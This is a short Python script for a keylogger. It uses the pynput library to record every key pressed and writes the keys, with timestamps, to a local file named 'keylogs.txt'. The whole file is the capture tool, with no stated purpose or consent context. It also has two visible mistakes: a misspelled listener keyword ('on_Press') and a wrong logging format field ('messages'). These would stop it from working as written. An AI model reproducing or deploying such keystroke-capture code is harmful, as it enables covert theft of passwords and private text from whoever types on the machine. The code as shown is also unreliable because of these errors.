from pynput.keyboard import Key, Listener

import logging

logdir = ""

logging.basicConfig(filename=(logdir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s:%(messages)s')

def onPress(key):
	logging.info(str(key))
	
	
with Listener(on_Press=onPress) as listener:
	listener.join()
